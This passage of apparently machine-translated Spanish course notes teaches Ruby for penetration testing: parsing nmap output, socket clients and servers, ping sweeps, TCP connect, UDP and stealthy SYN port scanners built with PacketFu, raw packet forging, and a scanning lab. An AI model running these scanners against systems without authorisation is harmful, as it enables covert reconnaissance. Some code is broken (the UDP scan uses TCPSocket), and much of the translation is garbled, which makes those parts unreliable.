  file = ARGV[2] if ARGV[2] #if the optional state holds
  file = ARGV[1] if !file # if no optional state

```

* primero tenemos que encontrar la sección en el archivo que contiene información de la IP proporcionada
* entonces tenemos que extraer todos los puertos que tienen el estado deseado (abierto, cierre, filtrado)

Ip y puerto-estado crearon anteriormente:

```ruby
ip_pattern=/^Nmap scan report For #{ip}$/
up_host_pattern=/^Host is up (?:.)*\n/
port_pattern=/^(?:(\d+)\/\w+\s+#{port_state}\s+.+\n)/
```

* ahora podemos leer una línea a la vez
* una vez que encontramos la IP correcta (ip-patrón emparecida), si el huésped está vivo (up-host-pattern, emparecido), podemos extraer cada puerto que esté abierto o cerrado o filtrado, de acuerdo a nuestra necesidad (puerto-patrón emparedo)

```ruby

stream = File.new(file, "r") # Open the file stream

stream.each do |line| # For each line of the stream
  line.match(ip_pattern) do # If the IP is found and the IP host is up, extract each port
    stream.readline.match(up_host_pattern) do
      stream.readline # Reads a line of type not shown *closed ports*
      stream.readline # Reads a line of type: "PORT STATE SERVICE"

      stream.each do |line| # From here, each line stores the port
        line =~ port_pattern # Line matches the port sub-pattern
        puts $1 if $1 # Print the port
        break if line == "\n" # If all the lines have been parsed, exit from the block
      end
    end
  end
end

```

Uso de ejemplo:

```ruby
./pextr-n.rb <ip> -filtered <nmap file>
./pextr-n.rb <ip> <nmap file> # open ports only
```

#### Grepable format

* el patrón recurrente es:
* port/status/protocol//service
* podemos hacerlo con el método String **scan**

Ejemplo:

```ruby
up_host = /^Host:\s#{ip}\s\(\)\s+Status: Up/
port_pattern = /(?:\s(\d+)\/#{port_state}\/[^\/]+\/\/[^\/]+\/\/\/)/
#for each line of the stream
stream.each do |line|
  #if the ip is found
  line.match(up_host) do
	#reads the next line and extracts each port with scan method
	stream.readline.scan(port_pattern) {|port| puts port}
  end
end

```

El uso es el mismo que el último:

```ruby
./pextr-g.rb <ip> -filtered <nmap file>
./pextr-g.rb <ip> <nmap file> # open ports only

```

#### XML format

* nos interesa el siguiente tipo de ruta:

```ruby
host > ports > port > portid
```

```
- the following syntax allows us to go only into ports nodes that are opened and are related to the ip <ip>
- //host[address/@add='10.50.97.5']//port/state/@state='open']
- Remember that [] are For conditional statement and @ is used to indicate an attribute of a node
- the above string means that if we find an **host** node that has the address child node with the attribute **addr** equals to 10.50.97.5, then it should go into the **port** node that has a state node with the attribute **states** equals to open
```

**parses the xml file to create a tree**

```ruby
doc = REXML::Document.new File.new(file)
```

**XPath syntax to extract only the desired ports**

```ruby
pattern = "//host[address/@addr='#{ip}']//port[state/@state='#{port_state}']"
```

> Para cada nodo de dirección hijo de nodo de huésbata pone a stdout el atributo del añadido

```ruby
doc.elements.each(pattern) do |port|
  puts port.attributes["portid"]
end
```

El uso es el mismo:

```ruby
./pextr-x.rb <ip> -filtered <nmap file>
./pextr-x.rb <ip> <nmap file> # open ports only
```

#### All together

```ruby

#!/usr/bin/ruby
# this method contains the main script logic
require "rexml/document"

begin
  
  (usage;exit) if !match_ip(ARGV[0])
  ip = ARGV[0]

  state,default = match_state(ARGV[1])
  type = default ? ARGV[1] : ARGV[2]
  file = default ? ARGV[2] : ARGV[3]
  f_type,file = match_file(type,file)

main(f_type,file,state,ip)

rescue SystemExit
rescue Exception => e
  puts e

end

```

```ruby

def usage
st = <<END
pextr eLearnSecurity \u00A9 2014
It extracts (open|filtered|closed) ports
of a specified ip address from nmap results.
Usage: pextr ip [Port State] [File Type] file|stream

PORT STATE
 -open      opened ports (default)
 -filtered  filtered ports
 -closed    closed ports
        
FILE TYPE
 -oX when file is an xml nmap output
 -oN when file is a normal nmap output
 -oG when file is a grepable nmap output
        
 [File Type] is not required when file has 
 .nmap | .xml | .gnmap extension

EXAMPLES
 pextr 10.50.97.5 nmap.xml
 pextr 10.50.97.5 -filtered -oX nmap.xmlout
 pextr 10.50.97.5 -closed file.nmap
 nmap -sS -n 192.168.1.15 | pextr 192.168.1.15 -oN

END
  puts st
end

```

## Network

```
The Network
	
  Socket Basics
		
  Penetration Testing Activities
		
  Raw Socket
	
  OS Interactions
```

### The Network

Veremos cómo conectarse a un servidor de tiempo:

→ TCPSocket - http://ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/TCPSocket.html

→ UDPSocket - http://ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/UDPSocket.html

→ high level protocols = http://ruby-doc.org/stdlib-1.9.3/libdoc/net/

### Sockets Basics

#### TCP Client

**RFC868**

→ http://tools.ietf.org/html/rfc868

* TCPSocket es muy simple, requiere una biblioteca de enchufados.
* Nos delega conectarnos al servidor TIME ip:64.113.32.5 puerto:37

Por ejemplo:

```ruby
require 'socket'
  true
s = TCPSocket.open("165.193.126.229",37)
res = s.gets
  "\xD6\x94\xA2\xC2"
int = res.unpack('N')
  [3600065218]
  # since the Unix timestamp starts from 1 jan 1970 GMT, we must subtract 2208988800
time = Time.at(int[0]-2208988800)
# Output: 2014-01-30 11:31:20 +0100
s.close
```

ejemplo 2:

```ruby
time = TCPSocket.open("165.193.126.229",37) do |s|
  Time.at(s.gets.unpack('N')[0] - 2208988800)
end
# Output: 2014-01-30 11:31:20 +0100

# we can also do it in one line, just replace the do .. end with { }
```

ejemplo 3:

```ruby
time = TCPSocket.open("165.193.126.229",37) { |s| Time.at(s.gets.unpack('N')[0] - 2208988800)}
```

* **addr** El método se puede utilizar para obtener información sobre parte local de la corriente. Devuelve la dirección local como una matriz que contiene address-family, puerto, hosco y dirección numeric-address

s.addr in Este caso devolverá estas informaciones

s.peeraddr - para obtener la misma información sobre la parte remota de la corriente

s.peeraddr true = para especificar que queremos una búsqueda inversa DNS y encontrar el nombre de host

* para especificar el puerto que necesitamos usar **open** con dos parámetros: ip, port ip

Por ejemplo:

```ruby
s = TCPSocket.open("165.193.126.229",37,"10.0.2.15",6000)
s.addr
["AF_INET",6000,"10.0.2.15","10.0.2.15"]
```

#### UDP Client

Udp es apátrida y sin conexión:

```ruby
require 'socket'
s = UDPSocket.new
s.send("",0,"165.193.126.229",37)

resp = s.recv(4)
# Output: "binary data"
time = Time.at(resp.unpack('N')[0] - 2208988800)
# Output: "time "

```

* udp puede perder paquetes porque no tiene un ack. Así que nuestro **recv** puede esperar los paquetes en congelar nuestra aplicación.
* Para avotar esta situación podemos usar **recv-nonblock** que no se espera Para la respuesta.
* si no se recibe respuesta, plantea una excepción; por lo tanto, puede rescatarla y continuar con la ejecución del guión.

#### The server

Crear una instancia de TCPServer con **new** y proporcionar la IP y el puerto como argumentos:

```ruby
server = TCPServer.new ip,port
```

Requetes de clientes de Cccept:

```ruby
loop do
  client = server.accept
end
```

Código lógico del servidor:

* primero, el servidor imprime la información sobre el cliente conectado; Luego envía la información correcta Tiempo de acuerdo con la cadena de tipo recibida

```ruby
print Time.new.to_s + " - IP: "+client.peeraddr[3]
print " Port: "+client.peeraddr[1].tp_s+"\n"
case client.gets.chop
  when "timestamp" then client.puts(Time.now.to_i)
  when "utc" then client.puts(Time.now.utc)
  when "local" then client.puts(Time.now)
  else client.puts("Invalid operation")
end
```

* para terminar el código se añade la def main(ip,port) al principio
* y cliente.close al final

Esto no es adecuado para manejar un gran número de conexiones de clientes al mismo tiempo. En esta situación, generalmente se utiliza un servidor multihilos; se da un hilo en cada conexión de cliente y el servidor puede manejar múltiples conexiones al mismo tiempo (esto evita largas colas)

Ejemplo de servidor tcp multihilo (esqueleto):

```ruby

# new TCP server bound to ip and port arguments
server = TCPServer.new ip,port
# loop indefinitely to accept clients requests
loop do
  # new request accepted - client is a socket
  # logic block is executed in a new thread
  Thread.start(server.accept) do |client|
	#.. server logic..
	# client variable is used to interact 
	# with the connected client
  end
end

```

#### The Client

```ruby
def main(host, port, type)
  # open the connection with the time server
  # available on host and port arguments
  TCPSocket.open(host, port) do |s|
	#send to the server the type of time we want
	s.puts(type)
	# (timestamp|utc|local)
	# receives and puts to stdout the formatted time
	puts s.gets
  end
end
```

Run the server:

```ruby
./time_Server.rb <ip> <port>
```

Run the client:

```ruby
./time_client.rb <ip> <port> timestamp
# Output: 1391425207
```

> El servidor obtendrá información de la solicitud del cliente

### Ping Sweep

* a través de solicitudes de eco ICMP
* si el huésped de destino está vivo (y el ping no está filtrado por un cortafuteros), responderá con una respuesta de eco ICMP
* Hay un montón de **gems** que pueden usar
* **net-ping**: una colección de clases que proporcionan diferentes maneras de ping computadoras

> To install a gem: gem install net-ping -r

Ejemplo:

```ruby
require 'net/ping'
host = ARGV[0]
req = Net::Ping::ICMP.new(host)

if req.ping then puts host + " UP"
else puts host + " DOWN" end

```

> si no se proporciona el tiempo de espera utilizamos 1 segundo por defecto. Luego escaneamos cada hués de la red, enviando una solicitud de ICMP y imprimimos la IP actual

```ruby
require 'net/ping'

def main(network, timeout)
  timeout = timeout ? timeout.to_f : 1

  (1..254).each do |i|
    ip_address = network + i.to_s
    req = Net::Ping::ICMP.new(ip_address, nil, timeout)

    puts ip_address if req.ping
  end
end

begin
  unless ARGV.length == 2
    puts "Usage: ruby script_name.rb network timeout"
  else
    main(ARGV[0], ARGV[1])
  end
end


```

* the network must be "xxx.xxx.xxx."
* eg: "192.168.1."

```ruby
Time ruby ping_sweep.rb <ip> 0.15 // 0.15 seconds For each IP
# 10.0.2.2
# 10.0.2.3
# 10.0.2.4
# etc
```

#### TCP Connect - Port Scanning

* un escaneo de puerto se puede realizar después de la identificación de un huésco vivo o se puede utilizar para verificar si un huésco está vivo.

Hay diferentes tipos de escaneo de puertos:

```ruby
TCP full connection
TCP SYN
TCP ACK
UDP
```

La estrategia para realizar el escaneo:

```ruby
with TCPSocket, we try to connec to an host port
if the connection is successful (TCP three way handshake), then the port is clearly open
if the connection is refused, then the port is closed or firewalled (the host or the firewall respond with RST+ACK)
otherwise, if we do not receive a response, there is probably a firewall that filters the port with no response at all.
```

* Imagine un servicio filtrado basado en direcciones IP de origen. Si u r no en la lista blanca IP de origen, u recibirá un RST-ACK, pero el puerto está realmente abierto, así como el servicio.

El esqueleto del guión

Para cada puerto entre **start-port** y **end-port**, nosotros la conexión e identificamos si está filtrado o abierto:

```ruby

require 'socket'

def main(host, start_port, end_port)
  open = []
  filtered = []

  start_port.upto(end_port) do |port|
    begin
      # Replace the comment below with your actual TCP socket connection logic
      socket = TCPSocket.new(host, port)
      socket.close
      open << port
    rescue StandardError
      filtered << port
    end
  end

  puts "OPEN" unless open.empty?
  puts open.join(', ') unless open.empty?
  puts "FILTERED" unless filtered.empty?
  puts filtered.join(', ') unless filtered.empty?
end

# Example usage:
# main("example.com", 80, 100)


```

El esqueleto de CONNECTION TCP SOCKET:

```ruby
begin
  TCPSocket.open(host,port)
  open.push port
rescue Errno::ETIMEDOUT
  filtered.push port
rescue Errno::ECONNREFUSED
end
```

> si no se produce una excepción, entonces el puerto está abierto y lo empujamos a la matriz abierta. Si se levanta un error de tiempo de espera, el puerto se filtra sin duda y lo empujamos en el array filtrado

Uso:

```ruby
ruby tcp_cps.rb <ip u want to scan> 1-600 # port range
```

```
- the nmap equivalent to this is **-sT**
- nmap -sT -n <ip> -p <range>
- nmap uses faster strategies. one of them is working with more than one thread.
- our script is slow, a solution to this problem would be implementing multi-threading
```

#### UDP Port scan

* Algunos servicios de importación como DNS, SNMP y DHCP utilizan UDP
* A menudo se ignora a menudo porque su apátrida y a veces identificada si un puerto UDP está abierto o cerrado puede tomar mucho tiempo.
* Por esta razón, durante nuestras auditorías de seguridad deberíamos realizar un escaneo portuario UDP, sólo a puertos y servicios conocidos, y sólo si es estrictamente necesario (no escanear grandes rangos de puertos)
* Informes de documentación de la Maestra de que un escaneo de puertos UDP completo y confiable (65535 puertos) puede tomar más de 18 horas en algunos sistemas.

Estrategia para identificar puertos abiertos de UDP:

```
first of all, we send an UDP packet to a port;
if we receive an ICMP error (destination unreachable or others) then we can conclude that the port is closed or firewalled;
if we receive an UDP response then the port is open and the service is available.
```

* UDP es apátrida, por lo tanto, si no recibimos una respuesta, existe la posibilidad de que se haya perdido un paquete (solicitud o respuesta).
* también existe la probabilidad de que un cortafuegas que evite enviar un paquete ICMP como respuesta. Por lo tanto, cuando usamos UDP, debemos tratar de enviar el paquete de solicitudes más de una vez.
* plataformas como Linux suelen evitar el envío de demasiados paquetes del mismo tipo (ICMP es una de ellas) con el fin de evitar congestiones de la red. Linux envía un paquete ICMP una vez por segundo; por lo tanto, nuestro script debe tener en cuenta este comportamiento.

Este es el esqueleto del guión. Aceptamos una serie de puertos para probar. Para cada puerto, tenemos que enviar algunos paquetes UDP y obtener cualquier respuesta:

```ruby

require 'socket'

def main(host, ports)
  open = []
  filtered = []
  closed = []

  # ports is an array of port
  ports.each do |port|
    begin
      # Replace the comment below with your actual UDP packet sending logic
      socket = UDPSocket.new
      socket.connect(host, port)
      socket.send("Your UDP packet payload", 0)
      open << port
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
      filtered << port
    rescue StandardError
      closed << port
    ensure
      socket&.close
    end
  end

  puts "OPEN" unless open.empty?
  puts open.join(', ') unless open.empty?
  puts "FILTERED|OPEN" unless filtered.empty?
  puts filtered.join(', ') unless filtered.empty?
  puts "CLOSED" unless closed.empty?
  puts closed.join(', ') unless closed.empty?
end

# Example usage:
# main("example.com", [80, 443, 8080])


```

* Para cada puerto targert, lo primero que hay que hacer es crear un UDPSocket que se acobará al huésco y puerto de destino.

Entonces queremos enviar paquetes de 5 UDP usando una estrategia de sincronización adecuada:

```ruby
ports.each do |port|
  u = UDPSocket.new
  u.connect(host,port)
  (1..5).each do |i|
	  #send 5 UDP packet
	  # with a proper timeout
  end
end
```

* Primero enviamos un paquete y esperamos la primera respuesta
* si no se recibe respuesta, se activa el tiempo de espera (tenga en cuenta que el tiempo de espera es incremental)

Si se activa el tiempo de espera Para los 5 paquetes entonces consideramos el puerto filtrado:

```ruby
require 'timeout'
require 'socket'

u = TCPSocket.new('example.com', port)
open = []
closed = []
filtered = []

(1..5).each do |i|
  begin
    Timeout.timeout(i * 0.5) do
      u.write("\0")
      u.recv(10)
      open.push(port)
    end
  rescue Errno::ECONNREFUSED
    closed.push(port)
  rescue Timeout::Error
    filtered.push(port) if i == 5
  ensure
    break
  end
end

u.close

```

Podemos mejorar el guión aún más:

> por añadido regex para verificar el formato del parámetro de comando (ip y puertos)

> añadió una lógica diferente (estrategia de tiempo o una multi-hilo)

### Raw Socket

Se puede utilizar para interactuar con la red utilizando una estrategia de bajo nivel. Suelen necesita privilegios de raíz para ser usados.

Los enchufadores crudos permiten falsificar paquetes de red (IP, UDP, TCP, etc.), pero se requiere un alto conocimiento de los protocolos de red y cabeceras.

* Si u r familiarizado con conceptos de bajo nivel, compruebe estos enlaces

→ http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/Socket.html

→ http://www.ruby-doc.org/stdlib-1.9.3/libdoc/socket/rdoc/BasicSocket.html

#### PacketFu

→ https://github.com/todb/packetfu

→ http://rubydoc.org/github/todb/packetfu/PacketFu

* PacketFu es una biblioteca Ruby Para leer y escribir paquetes a una interfaz de red.
* requiere **pcarub** para trabajar. (otra gema)

Siga estos pasos para instalar PacketFu en Kali:

```bash
apt-get install ruby-dev
apt-get install libpcap-dev
gem install -r pcaprub
gem install -r packetfu
```

Para encontrar cuál es su camino de gemas:

```ruby
gem env
```

Abierto PacketFu:

```ruby
# go to the examples path in <gem env path>
ruby packetfu-shell.rb
```

> si se habilita la captura de paquetes/inyecting funciona

**Usage**

```ruby
pry --simple-prompt
require 'packetfu'
```

Podemos utilizar muchas clases Para diferentes propósitos:

```ruby
PacketFu::IP
PacketFu::TCP
PacketFu::UDP
```

Con el fin de evitar escribir el espacio de nombres PacketFu cada vez, podemos utilizar **include**:

```ruby
include PacketFu
IPHeader # the same as PacketFu::IPHeader
TCPPacket # the same as PacketFu::TCPPacket
```

**Utils** clase contiene métodos de utilidad.

Por ejemplo, se puede utilizar para obtener información sobre nuestras interfaces de máquina:

```ruby
Utils.ifconfig("eth0")
```

Realizar una solicitud de ARP. // sin embargo devuelve la dirección mac solo si la IP especifica pertenece a su interfaz de red predeterminada (generalmente "et0"):

```ruby
Utils.arp("192.168.1.2")
```

Para ver el uso predeterminado de la interfaz de red por PacketFu:

```ruby
Utils.whoami?
```

#### Forge a custom packet

Clases de paquetes comunes:

```ruby
ARPPacket  # constructs ARP packets
EthPacket   # constructs Ethernet packets
ICMPPacket # constructs ICMP packets
IPPacket     # constructs IP packets
TCPPacket  # constructs TCP packets
UDPPacket # constructs UDP packets
```

Cada una de las clases anteriores utiliza cabecera y opción o banderas adecuadas:

```ruby
IPHeader     # a complete IP structure
ICMPHeader # a complete IP structure
TCPHeader   # a complete TCP structure
TCFlags     # Implements flag For TCPHeader
ARPHeader # a complete ARP structure
```

Deja ver cómo crear un paquete UDP desde cero:

```ruby
u = UDPPacket.new
```

Para enviar un paquete usando PacketFu

Primero tenemos que utilizar el método **recalc** para recalcular todas las chubascos de los paquetes, luego **to-w**:

```ruby
u.recalc
u.to_w
```

* ya que vamos a falsificar toda la cabecera de paquetes (Ethernet, IP y UDP), tenemos que tener cuidado para crear el paquete correctamente.
* Con el fin de obtener información como la IP fuente, la dirección MAC y la dirección MAC de enlace, podemos utilizar la clase **Utils**.
* Cuando no especificamos una interfaz, PacketFu utiliza el eth0 predeterminado, así que tenga en cuenta.

El método **Utils.whoami?** contiene los valores de campo correctos que necesitamos (fuente de MAC e IP direcciones, así como la dirección mac de gateway predeterminada):

```ruby
Utils.whoami?
s_ip = Utils.whoami?[:ip_saddr]
s_mac = Utils.whoami?[:eth_saddr] # source address
g_mac = Utils.whoami?[:eth_daddr] # destination address
```

Estaca el paquete crudo UDP:

```ruby
u.eth_saddr = s_mac
u.eth_daddr = g_mac
```

Set la cabecera IP:

```ruby
u.ip_saddr = s_ip
u.ip_daddr = "<destination IP>"
```

Set the UDP puertos de origen y de destino:

```ruby
u.udp_sport = 5000
u.udp_dport = 37
```

Ahora podemos enviar el paquete:

```ruby
u.recalc
u.to_w
```

> olfaar el tráfico con alambre para agarrar el paquete

* Puesto que estamos usando tomas crudas, enviamos los paquetes directamente a la red sin pasar por la pila TCP/IP del kernel
* Esto significa que en nuestro núcleo, no tenemos un enchuzo real (vinctuado puerto de origen UDP) que está esperando para una respuesta de tiempo UDP
* Como se define en el UDP/TCP RFC, cuando el núcleo recibe un paquete UDP no deseado, responde con un destino ICMP inalcanzable (Port inalcanzable)

Un truco para evitar la respuesta del kernel ICMP es crear un enchuco UDP que se une a nuestro puerto de origen.

Ahora el kernel tiene su enchuador unido al puerto de origen 5000 por lo que el paquete ICMP ya no es generado por el sistema operativo:

```ruby
s = UDPSocket.new
s.bind("192.168.3.24","5000")
u.to_w
```

* Doin lo mismo Para todos los demás paquetes puede ser tedioso. PacketFu permite algunos métodos diferentes para falsificar paquetes rápidamente

Podemos usar el parámetro **config**:

```ruby
u = UDPPacket.new(:config=>Utils.whoami?)
```

### TCP SYN port scanner

* Ahora podemos escribir un escáner de puerto más sofisticado que evite finalizar el apretón de manos de 3 vías. Esto se llama escaneo TCP SYN
* El escaneo TCP SYN se puede utilizar para no dejar rastros

Un ataque común de DOS se llama TCP SYN flood, donde el atacante envía una inundación de paquetes sinalo, hasta que ocurre un accidente.

#### The strategy

1. El paquete singráfico envía una sincronía
2. si el puerto abre la respuesta de destino con sinalo,
3. y enviamos RST para cerrar la conexión, significa que no cerramos el apretón de manos de 3 vías con otro ack
4. si el puerto está cerrado, después de la primera síntesis, el objetivo responde con un RST-ACK
5. si los puertos se filtran, enviaremos 2 sin respuesta

* Para crear TCPPacket usando paquetesFu, necesitamos establecer el Ethernet, los campos de cabecera IP y la cabecera TCP con el puerto de destino correcto y la bandera SYN habilitada

Podemos usar el **confi** aswell:

```ruby
t = TCPPacket.new(:config=>Utils.whoami?)
```

Presta atención, Eth destination ahora no es la puerta de entrada por defecto

* el huésco objetivo 192.168.3.14 pertenece a nuestra red

Desde su red, podemos agarrar el MAC con una petición de ARP:

```ruby
t.ip_daddr = "192.168.3.14"
t.eth_daddr = Utils.arp("192.168.3.14")
# mac output
t
```

> Ahora EthHeader y IPheader tienen el valor correcto

El puerto de destino es de 135, mientras que el puerto de origen puede ser un valor aleatorio:

```ruby
t.tcp_sport = 5000
t.tcp_dport = 135
t.tcp_flags.syn = 1

t
```

> Ahora el paquete TCP está correctamente configurado

Está listo para ser enviado:

```ruby
t.recalc
t.to_w
# we can analyse with wireshark
```

Queremos que nuestro script sea capaz de detectar el SYN-ACK. PacketFu proporciona la clase **Capture** para olfaar todos los paquetes recibidos en una interfaz de red específica.

* para usar **capture** necesitamos crear un objeto Capture y luego especificar la interfaz donde capturará el tráfico (etra 0 es la NIC predeterminada)
* después de esto, podemos utilizar el método de captura para olfaar los paquetes recibidos por la interfaz. También podemos especificar un filtro como parámetro de captura con el fin de capturar sólo paquetes específicos.

Para extraer todos los paquetes TCP que tienen dirección IP de origen igual a 192.168.3.14 y 135 como puerto de origen de la interfaz eth0:

```ruby
cap = Capture.new(:iface=>"eth0")
```

El filtro Para el método de captura se da usinf la sintaxis BPF (Berkeley Packet Filter):

```ruby
src host 192.168.3.14 and src port 135
cap.capture(:filter=>"src host 192.168.3.14 and src port 135")
```

Para comprobar si nuestra interfaz recibió un paquete que coinja con el filtro, podemos utilizar el siguiente método. Si devuelve cero, significa que no hay una coincidencia. De lo contrario, el paquete se devuelve:

```ruby
raw_packet = cap.next
```

* PacketFu permite uno para analizar paquetes crudos usando la clase Parse.

Al hacer el paquete de Packet crudo recibido obtendremos un paquete de PacketFu TCP:

```ruby
tcp_packet = Packet.parse raw_packet
```

> Como podemos ver en el intérprete, el paquete recibido es el paquete deseado SYN-ACK (flag A y S) procedente de port:135 y host:192.168.3.14

**The script**

En primer lugar, tenemos que iniciar un olfaador de paquetes que sea capaz de leer todos los paquetes de respuesta: SYN-ACK Para puertos abiertos y RST-ACK Para puertos cerrados.

* cuando el olfaador esté listo, podemos enviar el paquete TCP SYN Para cada puerto que queramos probar

Para todos los puertos que no están abiertos ni cerrados, hay un alto nivel que se filtran:

```ruby
def main(host, start_port,end_port)
  open = []; closed = []
  start_capture(host,open,closed,start_port,end_port)
  send_tcp_syn(host,start_port,end_port)
  filtered=(start_port..end_port).to_a - (open+closed)
  puts "OPEN",open if !open.empty?
  puts "FILTERED",filtered if !filtered.empty?
end
```

Para el método **start-capture**, se requiere un nuevo hilo; olfaamos TCP SYN-ACK y RST-ACK al mismo tiempo que enviamos TCP SYN:

```ruby
require 'packetfu'

def start_capture(host, open_ports, closed_ports, start_port, end_port)
  Thread.new do
    cap = Capture.new
    cap.capture(filter: "tcp and src host #{host}")

    cap.stream.each do |raw_packet|
      tcp_packet = Packet.parse(raw_packet)
      port = tcp_packet.tcp_sport.to_i

      next unless port.between?(start_port, end_port)

      flags = tcp_packet.tcp_flags

      if flags.syn == 1 && flags.ack == 1 && !open_ports.include?(port)
        open_ports.push(port)
      elsif flags.rst == 1 && flags.ack == 1 && !closed_ports.include?(port)
        closed_ports.push(port)
      end
    end
  end
end

```

* El método **send.tcp.yn** crea primero un TCPPacket y establece la dirección mac correcta (puerta de entrada de defectos si el host está fuera de la red - dirección de mac host viniendo de la solicitud de ARP si el host pertenece a nuestra red)

Luego Para cada puerto, envía un paquete TCP SYN (dos veces para evitar la pérdida de paquetes):

```ruby
def send_tcp_syn(host,start_port,end_port)
  t = TCPPacket.new(:config => Utils.whoami?)
  t.eth_daddr = Utils.arp(host) if Utils.arp(host)
  t.ip_daddr = host
  t.tcp_flags.syn = 1
  start_port.upto(end_port) do |port|
	t.tcp_dport = port
	t.recalc
	2.times.each { t.to_w;sleep(0.02)}
  end
  sleep(1)
end
```

Los métodos de sueño en la implementación anterior se utilizan para evitar crear una inundación de paquetes SYN contra el huésco objetivo.

* con demasiadas solicitudes TCP Para la conexión, el huésco objetivo puede volverse sospechoso
* cuanto mayor sea el tiempo entre cada TPC SYN, más silencioso es el escaneo.

Tcp.sps.rb (escáner de puerto TCP SYN), empezamos a leer los parámetros:

```ruby
ruby tcp_sps.rb host start_port-end_port
```

ejemplo:

```ruby
ruby tcp_sps.rb 192.168.3.14 100-200
# scan ports from 100 to 200 on the host 192.168.3.14
```

### Kernel Exec

* reemplaza el actual proceso Ruby con el comando pasado como argumento
* esto significa que el comando original se detiene. por lo tanto no hay manera de interactuar con el nuevo comando.
* El método **exec** es una abreviatura For kernel.exec método y podría ser útil si u tiene un script que ejecuta algunas lógicas y luego necesita llamar a un comando externo del sistema operativo sin interactuar con él.

u probablemente nunca tendrá la necesidad de usarlo, pero es un método interesante que tal vez queramos saber:

```ruby
pry --simple-prompt
exec 'echo "Hello world"'
# Output: Hello World
```

> El comando de eco sustituye al intérprete de enserodece

#### Kernel System

Se diferencia del exec. no reemplaza el proceso actual; en su lugar crea una sucisión y ejecuta el comando pasado como argumento dentro de él.

* finalmente, devuelve la verdad si el argumento del comando se encontró en el sistema operativo y se ejecutó correctamente. de lo contrario devuelve false.
* además, imprime el **stdout** y el **stderror** del comando como argumento y establece la variable global $? con la información de estado de salida de la ejecución del comando.
* El sistema también es un método Kernel. Por lo tanto u puede utilizar la notación OO **Kernel.system** para llamarlo.

Ejemplo:

```ruby
→ system 'echo "Hello"'
$? 
# now the global variable holds some status
$?.pid 
# Output: 3458
$?.exitstatus 
# Output: 0
```

> Cuando el comando no se encuentra. Falsa se devuelta y se imprime el esderror.

* El método del sistema no termina la ejecución del proceso original, pero no proporciona una manera de interactuar con el comando ejecutado.
* por lo tanto, no puede manejar las salidas de los subcomandos (stdout y stderror) de ninguna manera.

#### Kernel Backticks

Es otro método para ejecutar comandos del sistema en una sub-concha

* funciona como método del sistema Kernel pero el valor devuelto es la salida estándar del comando ejecutado en la sub-concha
* Al usarlo, u puede manejar la salida de cualquier comando subejecutado Usage:

```ruby
output = 'echo "hello"'
output

//"hello"
// or u can use with the OO notation Kernel.'(command)            '
```

Por ejemplo, cómo extraer la dirección eth0 ip

Con regex:

```ruby
'ifconfig eth0' =~/inet addr:([0-9.]*)/
$1
# Output:  192.168.3.29
```

Con los bastidor de kernel:

```ruby
puts %x{ifconfig eth0}
# Output: eth0 output
```

### IO popen

Método proporcionado por la clase IO

El comando stdin y stdout se conectarán al objeto IO devuelto (no puede conseguir el esderor)

Usage:

```ruby
fd = IO.popen('echo "hello"')
fd.readline
# Output: "hello"
```

IO.popen abre flujos de entrada y salida con el suborden (según el modo de apertura rúr.w.w.w....). Por lo tanto, u puede utilizar todos los métodos vistos cuando hablamos de los arroyos.

* Además: http://ruby-doc.org/core-1.9.3/IO.html

#### Open3 popen3

Usado si quiere interactuar con todas las tres corrientes de sub-mando: stdin, stdout y stderr:

```ruby
require 'open3'
```

Ejemplo: ejecutar el comando nslookup:

```ruby
sin,sout,serr = Open3.popen3('nslookup')
sin.puts "www.google.com"
sout.gets
# Output: "Server:\t\t192.168.3.1\n"

sout.gets
# Output: "Address:\t\t192.168.3.1#53\n"
```

### All together

Los más utilizados son Kernel backticks y Open3 popen3

* queremos crear un script que tome como entrada una red de destino, realizar un barrido de ping y luego muestra un menú para seleccionar una técnica de escaneo de puerto (UDP, Conexión TCP, TCP SYN)
* Necesitamos interactuar con comandos **uphosts** y **pextr**; tenemos que enviar la salida nmap a la corriente de entrada de comandos.
* por lo tanto, tenemos que utilizar un método que permite enviar datos a stdin; utilizaremos Open3 popen3

Comando de uso **scan**:

```ruby
scan <network>
// discover targets in the network using ICMP ping request strategy
```

> Como de costumbre, el script se puede mejorar. podemos añadir otras técnicas de escaneo de puertos, la posibilidad de elegir una gama de puertos personalizados, y así decir.

### Lab

#### Task 1: Discovery alive hosts

```ruby
nmap -PE -sn -n 172.16.10.0/24 -oA=rede10
```

* Ejecute un escaneo de descubrimiento host con Nmap y guarde la salida en los tres formatos más utilizados: XML, gruñón y salida normal. Las redes remotas son 172.16.10.0/24 y 172.16.11.0/24.

#### Task 2 - ip extraction

```ruby
sudo nmap -PE -sn -n 172.16.10.0/24 | ./ip_extraction_nmap-2.rb
```

// el guión

```ruby

#!/usr/bin/ruby

begin
  stream = $stdin
  stream.each do |line|
	/^(?:Nmap scan report \for )((?:\d{1,3}\.){3}\d{1,3})/ =~ line
	puts $1 if $1
end
rescue Exception => e
  puts
end

```

#### Task 3 - Open ports

```ruby
nmap -sV -T4 172.16.10.0/24 -oA=rede10-ports
```

#### Task 4 - Port extraction

## Web

```
Starting Point

Request and Response

Data Extraction

Exercises
```

### HTTP Protocol

* no enfocaremos en http
* Rubys alternativas para interactuar con un servidor web

#### Using simple socket

* puede suceder que tenga que probar el comportamiento de un servidor cuando recibe paquetes incorrectos.

Nuestro objetivo es la simple página de índice del servidor web apache:

```ruby
service apache2 start
```

* queremos obtener la misma página usando Ruby y un enchufá.

Lo primero que hay que hacer es abrir una conexión TCP con nuestro localhost en el puerto 80:

```ruby
s = TCPSocket.new("localhost",80)
```

El verbo correcto a utilizar es GET y la ruta es **/**:

```ruby
request = "GET / HTTP/1.0\r\n\r\n"
s.print(request)

response = s.read
# Output: is the http response
```

Podemos dividir las cabeceras y el cuerpo para analizarlos por separado:

```ruby
headers,body = response.split("\r\n\r\n")
headers
# Output: of headers

body
# Output:  of body
```

* Podemos tratar de enviar una petición mal configurada
* como **GE** en lugar de **GET**
* // método no implementado
* esta estrategia puede ser útil para detectar si el servidor es vulnerable a ataques de paquetes mal configurados

#### Net::HTTP library

→ http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html

Podemos usar la clase Net::HTTP de diferentes maneras. podemos utilizar sus métodos de clase o sus instancias para lograr el mismo resultado:

```ruby
require 'net/http'
response = Net::HTTP.get("localhost","/")
print response
// we get the output of body
```

#### Open-uri library

